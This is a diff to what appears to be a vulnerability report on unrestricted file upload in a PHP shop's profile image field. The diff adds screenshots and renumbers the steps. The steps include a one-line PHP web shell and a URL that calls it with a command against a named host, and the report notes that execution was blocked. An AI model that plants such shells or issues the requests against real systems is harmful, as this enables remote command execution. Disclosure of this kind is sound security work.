@@ -57,15 +57,22 @@ if (isset($_FILES['c_image']) && $_FILES['c_image']['error'] == 0) {
 
 1. Log in as a customer, navigate to **Edit Account**.
 2. In the **Profile Image** field, select `sample_setup.exe` — the file uploads successfully without any error.
-3. To test a webshell, create a file `shell.php`:
+   
+    <img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/14b1286c-6fde-4f07-89b5-31d47bb083c8" />
+    
+    <img width="600" height="378" alt="image" src="https://github.com/user-attachments/assets/18e1dc5e-0aea-4875-8f8a-3cc355ecde2e" />
+
+4. To test a webshell, create a file `shell.php`:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
-4. Upload `shell.php`, then attempt to access:
+
+5. Upload `shell.php`, then attempt to access:
    ```
    http://dibishop.duckdns.org/customer/customer_images/shell.php?cmd=id
    ```
-5. Execution via forced browsing was blocked by a network-level security layer.
+6. Execution via forced browsing was blocked by a network-level security layer.
+    <img width="650" height="140" alt="image" src="https://github.com/user-attachments/assets/d5f3a4db-d9a0-4741-a2d3-096543b1a8db" />
 
 ---
 
